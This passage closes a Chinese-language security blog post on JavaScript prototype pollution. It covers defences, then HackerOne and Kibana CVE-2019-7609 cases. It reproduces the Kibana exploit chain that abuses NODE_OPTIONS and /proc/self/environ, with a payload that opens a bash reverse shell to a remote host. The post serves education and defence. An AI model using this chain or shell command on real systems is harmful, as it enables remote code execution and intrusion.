屬性的空物件，就是真的空物件，任何的 method 都沒有。也因為這樣，所以就不會有 prototype pollution 的問題：</p><pre class="language-js"><code class="language-js"><span class="token keyword">var</span> obj <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><br>obj<span class="token punctuation">[</span><span class="token string">'__proto__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span> <span class="token comment">// 根本沒有 __proto__ 這個屬性</span><br><span class="token comment">// TypeError: Cannot set property 'a' of undefined</span></code></pre><p>像是開頭提到的解析 query string 的 library，其實已經用了這種方式來防禦，像是每週下載次數高達 1 千萬次的 <a href="https://www.npmjs.com/package/query-string" rel="noopener noreferrer" target="_blank">query-string</a>，<a href="https://github.com/sindresorhus/query-string#parsestring-options" rel="noopener noreferrer" target="_blank">文件</a>上面就寫了：</p><blockquote><p>.parse(string, options?)<br>Parse a query string into an object. Leading ? or # are ignored, so you can pass location.search or location.hash directly.</p><p>The returned object is created with Object.create(null) and thus does not have a prototype.</p></blockquote><p>其他還有像是建議用 <code>Map</code> 來取代 <code>{}</code>，但我覺得目前大家還是習慣用 object 居多，我自己覺得 <code>Object.create(null)</code> 會比 Map 好用一點。</p><p>或是用 <code>Object.freeze(Object.prototype)</code>，把 prototype 凍結住，就沒辦法去修改：</p><pre class="language-js"><code class="language-js">Object<span class="token punctuation">.</span><span class="token function">freeze</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><br><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><br>obj<span class="token punctuation">[</span><span class="token string">'__proto__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><br><span class="token keyword">var</span> obj2 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><br>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj2<span class="token punctuation">.</span>a<span class="token punctuation">)</span> <span class="token comment">// undefined</span></code></pre><p>但 <code>Object.freeze(Object.prototype)</code> 的問題之一是假設某個第三方套件有去修改 <code>Object.prototype</code>，比如說為了方便直接在上面加一個屬性，那就會比較難 debug，因為 freeze 之後去修改並不會造成錯誤，只是不會修改成功而已。</p><p>所以你可能會發現你的程式因為某個第三方套件壞掉了，但你不知道為什麼。還有一個我想到的可能風險是 polyfill，假設未來因為版本問題需要幫 <code>Object.prototype</code> 加上 polyfill，就會因為 freeze 的關係而失效。</p><p>至於 Node.js，還可以使用 <code>--disable-proto</code> 這個 option 來把 <code>Object.prototype.__proto__</code> 關掉，詳情可以參考<a href="https://nodejs.org/api/cli.html#cli_disable_proto_mode" rel="noopener noreferrer" target="_blank">官方文件</a></p><p>或是未來也有可能使用 document policy 做處理，可以關注這個 issue： <a href="https://github.com/WICG/document-policy/issues/33" rel="noopener noreferrer" target="_blank">Feature proposal: Mitigation for Client-Side Prototype Pollution</a></p><h2 id="%E5%AF%A6%E9%9A%9B%E6%A1%88%E4%BE%8B"><a href="#%E5%AF%A6%E9%9A%9B%E6%A1%88%E4%BE%8B" class="direct-link">#</a> 實際案例</h2><p>最後我們來看兩個 prototype pollution 的真實案例，讓大家更有感覺一點。</p><p>第一個案例是知名 bug bounty 平台 hackerone 的漏洞（對，就是 bug bounty 平台本身的漏洞），完整報告在這裡：<a href="https://hackerone.com/reports/986386" rel="noopener noreferrer" target="_blank">#986386 Reflected XSS on www.hackerone.com via Wistia embed code</a></p><p>在網站上他們用了一個第三方套件，而在這個第三方套件裡面有一段程式碼長這樣：</p><pre class="language-js"><code class="language-js">i<span class="token punctuation">.</span>_initializers<span class="token punctuation">.</span><span class="token function function-variable">initWLog</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><br>    <span class="token keyword">var</span> e<span class="token punctuation">,</span> t<span class="token punctuation">,</span> n<span class="token punctuation">,</span> o<span class="token punctuation">,</span> a<span class="token punctuation">,</span> l<span class="token punctuation">,</span> s<span class="token punctuation">,</span> d<span class="token punctuation">,</span> u<span class="token punctuation">,</span> p<span class="token punctuation">,</span> c<span class="token punctuation">;</span><br>    <span class="token keyword">if</span> <span class="token punctuation">(</span>t <span class="token operator">=</span> i<span class="token punctuation">.</span>url<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>href<span class="token punctuation">)</span><span class="token punctuation">,</span><br>    document<span class="token punctuation">.</span>referrer <span class="token operator">&&</span> <span class="token punctuation">(</span>u <span class="token operator">=</span> i<span class="token punctuation">.</span>url<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>referrer<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span></code></pre><p>它會去解析 <code>location.href</code> 跟 <code>document.referrer</code>，這兩者都是攻擊者可控的，然後 <code>i.url.parse</code> 這個 function 有著 prototype pollution 的漏洞，所以可以污染任意屬性。</p><p>污染之後，作者發現了另外一段程式碼，這一段程式碼跟我們前面寫過的 <code>createElement</code> 有異曲同工之妙，<code>fromObject</code> 會去遍歷屬性然後放到 DOM 上：</p><pre class="language-js"><code class="language-js"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>chrome <span class="token operator">=</span> r<span class="token punctuation">.</span>elem<span class="token punctuation">.</span><span class="token function">fromObject</span><span class="token punctuation">(</span><span class="token punctuation">{</span><br>    id<span class="token operator">:</span> r<span class="token punctuation">.</span><span class="token function">seqId</span><span class="token punctuation">(</span><span class="token string">'wistia_chrome_'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><br>    <span class="token keyword">class</span><span class="token operator">:</span> <span class="token string">'w-chrome'</span><span class="token punctuation">,</span><br>    style<span class="token operator">:</span> r<span class="token punctuation">.</span>generate<span class="token punctuation">.</span><span class="token function">relativeBlockCss</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><br>    tabindex<span class="token operator">:</span> <span class="token operator">-</span><span class="token number">1</span><br><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>所以只要污染 <code>innerHTML</code>，就可以利用這個 script gadget 製造出一個 XSS 漏洞。實際的攻擊方式就是構造出一個能夠觸發 prototype pollution + XSS 的網址，只要把網址傳給別人，點開以後就會直接遭受到攻擊。</p><p>這攻擊後半段還有繞過 CSP 的段落，用的是之前我在 <a href="https://tech-blog.cymetrics.io/posts/huli/front-end-supply-chain-attack-cdnjs/">從 cdnjs 的漏洞來看前端的供應鏈攻擊與防禦</a>中有提過的技巧。</p><p>另一個案例是 Kibana 的漏洞，原始文章在這裡：<a href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/" rel="noopener noreferrer" target="_blank">Exploiting prototype pollution – RCE in Kibana (CVE-2019-7609)</a>，官方對於這個漏洞的描述是這樣的：</p><blockquote><p>An attacker with access to the Timelion application could send a request that will attempt to execute javascript code. This could possibly lead to an attacker executing arbitrary commands with permissions of the Kibana process on the host system.</p></blockquote><p>在 Kibana 裡面有一個 Timelion 的功能，可以自己輸入語法並且畫成圖表，而下面這一段語法可以污染 prototype：</p><pre class="language-js"><code class="language-js"><span class="token punctuation">.</span>es<span class="token punctuation">.</span><span class="token function">props</span><span class="token punctuation">(</span>label<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>x<span class="token operator">=</span><span class="token string">'ABC'</span><span class="token punctuation">)</span></code></pre><p>污染 prototype 只是第一步，下一步是要找出 script gadget，kibana 中的其中一段程式碼長這樣子：</p><pre class="language-js"><code class="language-js">  <span class="token keyword">var</span> env <span class="token operator">=</span> options<span class="token punctuation">.</span>env <span class="token operator">||</span> process<span class="token punctuation">.</span>env<span class="token punctuation">;</span><br>  <span class="token keyword">var</span> envPairs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><br><br>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> key <span class="token keyword">in</span> env<span class="token punctuation">)</span> <span class="token punctuation">{</span><br>    <span class="token keyword">const</span> value <span class="token operator">=</span> env<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">;</span><br>    <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><br>      envPairs<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string template-punctuation">`</span><span class="token interpolation"><span class="token punctuation interpolation-punctuation">${</span>key<span class="token punctuation interpolation-punctuation">}</span></span><span class="token string">=</span><span class="token interpolation"><span class="token punctuation interpolation-punctuation">${</span>value<span class="token punctuation interpolation-punctuation">}</span></span><span class="token string template-punctuation">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><br>    <span class="token punctuation">}</span><br>  <span class="token punctuation">}</span></code></pre><p>這一段會來拿構造環境變數，而這個環境變數會用來跑新的 node process，例如說 envPairs 如果是 <code>a=1</code> 的話，應該就會跑 <code>a=1 node xxx.js</code> 這個指令。</p><p>既然是跑 node.js，我們可以利用 <code>NODE_OPTIONS</code> 這個環境變數來偷偷引入檔案：</p><pre class="language-js"><code class="language-js"><span class="token comment">// a.js</span><br>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'a.js'</span><span class="token punctuation">)</span><br><br><span class="token comment">// b.js</span><br>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'b.js'</span><span class="token punctuation">)</span><br><br><span class="token comment">// 跑這個指令，用環境變數引入 a.js</span><br><span class="token constant">NODE_OPTIONS</span><span class="token operator">=</span><span class="token string">"--require ./a.js"</span> node b<span class="token punctuation">.</span>js<br><br><span class="token comment">// 輸出</span><br>a<span class="token punctuation">.</span>js<br>b<span class="token punctuation">.</span>js</code></pre><p>所以，如果我們可以上傳一個 js 檔案，就可以搭配 prototype pollution 去執行這個檔案了。聽起來有點麻煩，有其他方法嗎？</p><p>有！有一個滿常用的技巧是有些檔案的內容其實是可控的，例如說 PHP 中的 session 內容就有機會控制，可參考這一篇：<a href="https://kb.hitcon.org/post/165429468072/%E9%80%8F%E9%81%8E-lfi-%E5%BC%95%E5%85%A5-php-session-%E6%AA%94%E6%A1%88%E8%A7%B8%E7%99%BC-rce" rel="noopener noreferrer" target="_blank">透過 LFI 引入 PHP session 檔案觸發 RCE</a>，而另一個 Linux 系統中的檔案 <code>/proc/self/environ</code> 則是會有現在的 process 的所有環境變數。</p><p>如果我們建立一個環境變數叫做 <code>A=console.log(123)//</code>，<code>/proc/self/environ</code> 的內容就會變為：</p><pre class="language-js"><code class="language-js"><span class="token constant">A</span><span class="token operator">=</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token comment">//YARN_VERSION=1.1PWD=/userLANG=en_US.UTF-8....</span></code></pre><p>就變成了合法的 JS 程式碼！</p><p>於是就可以利用這樣的方式去執行它：</p><pre class="language-js"><code class="language-js"><span class="token constant">NODE_OPTIONS</span><span class="token operator">=</span><span class="token string">"--require /proc/self/environ"</span> <span class="token constant">A</span><span class="token operator">=</span><span class="token string">'console.log(1)//'</span> node b<span class="token punctuation">.</span>js</code></pre><p>作者最後給出的 code 長這樣：</p><pre class="language-js"><code class="language-js"><span class="token punctuation">.</span><span class="token function">es</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">props</span><span class="token punctuation">(</span>label<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">AAAA</span><span class="token operator">=</span><span class="token string">'require("child_process").exec("bash -i >& /dev/tcp/192.168.0.136/12345 0>&1");process.exit()//'</span><span class="token punctuation">)</span><br><span class="token punctuation">.</span><span class="token function">props</span><span class="token punctuation">(</span>label<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">NODE_OPTIONS</span><span class="token operator">=</span><span class="token string">'--require /proc/self/environ'</span><span class="token punctuation">)</span></code></pre><p>污染了兩個不同的屬性，創造了兩個環境變數，一個用來把 <code>/proc/self/environ</code> 變成合法的 JS 並且包含了要執行的程式碼，另一個 <code>NODE_OPTIONS</code> 則透過 <code>--require</code> 去引入 <code>/proc/self/environ</code>，最後就串成了可以執行任意程式碼的 RCE 漏洞！</p><h2 id="%E7%B5%90%E8%AA%9E"><a href="#%E7%B5%90%E8%AA%9E" class="direct-link">#</a> 結語</h2><p>我自己在接觸資安以前，是沒有聽過 prototype pollution 的。</p><p>因此當我第一次接觸到 prototype pollution 這個漏洞的時候，我覺得有些驚訝。我驚訝的點在於，為什麼我從來沒聽過這個？比起前端常見的漏洞像是 XSS 或是 CSRF 等等，prototype pollution 的知名度似乎低了許多。</p><p>有些人第一次看到這名詞可能是因為某個 NPM 的 package 有這個漏洞，升級版本以後就修掉了，但可能沒有去理解這個漏洞的成因以及可能的影響。</p><p>我自己其實滿愛這個漏洞的，第一是我覺得成因很有趣，第二是我覺得尋找 script gadget 也很有趣。總之呢，希望能藉由這篇文章，讓更多前端工程師認識到這個漏洞，並且知道它的原理以及防禦方式。</p><p>最後推薦大家一篇超讚的文章，透過自動化的方式去檢測 prototype pollution 漏洞，並且找出發生問題的地方，我覺得把 prototype pollution 又提升到了另一個境界：<a href="https://blog.s1r1us.ninja/research/PP" rel="noopener noreferrer" target="_blank">A tale of making internet pollution free - Exploiting Client-Side Prototype Pollution in the wild</a></p><div class="article-footer"><a href="https://tech-blog.cymetrics.io/posts/huli/prototype-pollution/" on-click="share"><img alt="Share" src="/img/icons/icon_external link hyperlink.svg" height="24" width="24">Share this post</a></div><div><p style="font-weight: bold;">Tag</p><div class="post-tags"><a href="/tags/security/" class="post-tag">#Security</a> <a href="/tags/front-end/" class="post-tag">#Front-end</a></div><p style="font-weight: bold;">Recommendation</p><ol><li><a href="/posts/nick/exchange/">如何選擇安全的交易所</a></li><li><a href="/posts/nick/selenuim/">資安也要自動化 Selenium</a></li><li><a href="/posts/jo/zerobased-common-risk-fix/">資安科普番外篇（二）-如何有效率選擇風險進行修復 feat.風險和法規息息相關？！</a></li><li><a href="/posts/crystal/email-sec-theory/">關於 email security 的大小事 — 原理篇</a></li><li><a href="/posts/jo/zerobased-cross-site-scripting/">零基礎資安系列（二）-認識 XSS（Cross-Site Scripting）</a></li></ol></div><div class="article-author"><img alt="huli" src="/img/authors/huli_logo.jpg" class="article-author__img" data-deopt="true"><div class="article-author__info"><div class="article-author__title">Author</div><div class="article-author__author"><a href="/posts/huli">huli</a></div><div class="article-author__intro">Act as a bridge between Front-end and Security world</div></div></div><p style="font-weight: bold;">Discussion(login required)</p><script async="" src="https://utteranc.es/client.js" crossorigin="anonymous" id="utterance-script" issue-term="title" label="utterance" repo="cymetrics/blog" theme="github-light"></script><script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","headline":"基於 JS 原型鏈的攻擊手法：Prototype Pollution","image":["https://tech-blog.cymetrics.io/img/posts/huli/prototype-pollution/1-repeat-1920w.png","https://tech-blog.cymetrics.io/img/posts/huli/prototype-pollution/2-search-1920w.png","https://tech-blog.cymetrics.io/img/icons/icon_external link hyperlink.svg","https://tech-blog.cymetrics.io/img/authors/huli_logo.jpg"],"author":{"@type":"Person","name":"huli"},"publisher":{"@type":"Organization","name":"Cymetrics Tech Blog","url":"https://tech-blog.cymetrics.io","logo":{"@type":"ImageObject","url":"https://tech-blog.cymetrics.io/img/favicon/favicon-512x512.png","width":512,"height":512}},"url":"https://tech-blog.cymetrics.io/posts/huli/prototype-pollution/","mainEntityOfPage":"https://tech-blog.cymetrics.io/posts/huli/prototype-pollution/","datePublished":"2021-09-29","dateModified":"2023-01-30","description":"# 前言 身為一個前端工程師，或是一個會寫 JavaScript 的人，你一定多少有聽過 prototype 這個名詞，甚至面試的時候也會考到相關的題目。 但你可能沒聽過的是，在 JavaScript..."}</script></article></main><footer><div class="footer-logos"><a href="https://www.facebook.com/cymetrics" rel="noopener noreferrer" target="_blank"><img alt="facebook" src="/img/icons/icon_social media_facebook.svg" height="30" width="30"></a><a href="https://www.linkedin.com/company/cymetrics" rel="noopener noreferrer" target="_blank"><img alt="linkedin" src="/img/icons/icon_social media_linkedln.svg" height="30" width="30"></a><a href="https://tech-blog.cymetrics.io/feed/feed.xml" rel="noreferrer noopener" target="_blank"><img alt="rss feed" src="/img/icons/rss-feed.svg" height="30" width="30"></a></div><div class="copyright">© 2021 Cymetrics Tech Blog, based on <a href="https://github.com/google/eleventy-high-performance-blog" rel="noopener noreferrer" target="_blank">eleventy-high-performance-blog</a>. <a href="https://oneinfinity.global/" rel="noopener noreferrer" target="_blank">OneInfinity</a></div></footer><script>// light/dark theme switch
      // disable dark mode for now
      const menuBtn = document.querySelector('.menu__btn')
      menuBtn.addEventListener('click', function() {
        document.querySelector('body').classList.toggle('lock')
        menuBtn.classList.toggle('menu__btn--close');
        document.querySelector('.nav__links').classList.toggle('nav__links--open')
      })</script></body></html>